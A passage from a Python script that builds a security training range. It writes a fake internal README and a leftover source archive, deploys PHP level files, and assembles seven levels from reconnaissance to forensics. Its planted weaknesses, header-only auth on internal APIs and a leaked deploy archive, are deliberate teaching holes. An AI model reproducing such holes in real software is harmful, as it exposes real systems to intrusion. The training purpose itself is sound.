3. 内部接口无需鉴权中间件，仅校验请求头

## 已知待办

- [ ] 归档包应在本目录部署完成后删除
- [ ] 内部接口建议增加来源 IP 白名单
""",
    })
    write(d / "src/site-2024.tar.gz", archive)


# ==================================================================
# PHP 源码
# ==================================================================

def deploy_php():
    """
    把 phpsrc/ 下的 PHP 源码原样复制到 static/ 对应关卡目录。

    为什么源码单独放 phpsrc/ 而不是直接写进 static/？
      ① static/ 是"运行时目录"，跑 --clean 会被整个删掉重来；
         PHP 源码是**手写的源代码**，得能改、能 diff、能版本管理。
      ② 分开后职责清晰：
         phpsrc/   人写的
         static/   机器拼的（含二进制资产）＋ 从这里复制过去的 PHP
    """
    src_root = BASE_DIR / "phpsrc"
    if not src_root.is_dir():
        print("  [i] 未找到 phpsrc/，跳过 PHP 源码部署")
        return 0

    count = 0
    for php in sorted(src_root.rglob("*.php")) + sorted(src_root.rglob("*.txt")):
        rel = php.relative_to(src_root)
        # phpsrc/l1/phpinfo.php → static/l1/phpinfo.php
        target = STATIC / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(php, target)
        print(f"  部署 {rel}  ({target.stat().st_size} B)")
        count += 1
    return count


# ==================================================================
# 入口
# ==================================================================

def main():
    ap = argparse.ArgumentParser(description="生成靶场静态资产")
    ap.add_argument("--clean", action="store_true", help="先删除 static 目录再生成")
    args = ap.parse_args()

    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

    if args.clean and STATIC.exists():
        shutil.rmtree(STATIC)
        print("  已清空 static/")

    # 关卡目录 → 构建函数的映射。用表格驱动而不是手写一长串 print，
    # 好处是加关卡时只改这一处，不会漏掉"资产建了但没输出"。
    builders = (
        ("L0 未授权站点（禁区）", build_l0),
        ("L1 公开的秘密", build_l1),
        ("L2 藏与找", build_l2),
        ("L3 抗侦察", build_l3),
        ("L4 逻辑门", build_l4),
        ("L5 取证", build_l5),
        ("L6 链路", build_l6),
    )
    total_steps = len(builders) + 2       # +1 门户、+1 PHP 部署

    print(f"\n  [1/{total_steps}] 门户与样式")
    build_portal()
    write(STATIC / "style.css", CSS)

    for idx, (name, builder) in enumerate(builders, start=2):
        print(f"  [{idx}/{total_steps}] {name}")
        builder()

    php_step = total_steps
    print(f"  [{php_step}/{total_steps}] 部署 PHP 源码（phpsrc/ → static/）")
    php_count = deploy_php()

    print(f"\n  [{total_steps}/{total_steps}] 校验静态资产")
    total = 0
    for path in sorted(STATIC.rglob("*")):
        if path.is_file():
            total += 1
    print(f"  共生成 {total} 个静态文件（含 {php_count} 个 PHP 源码）")
    print(f"  位置：{STATIC}\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
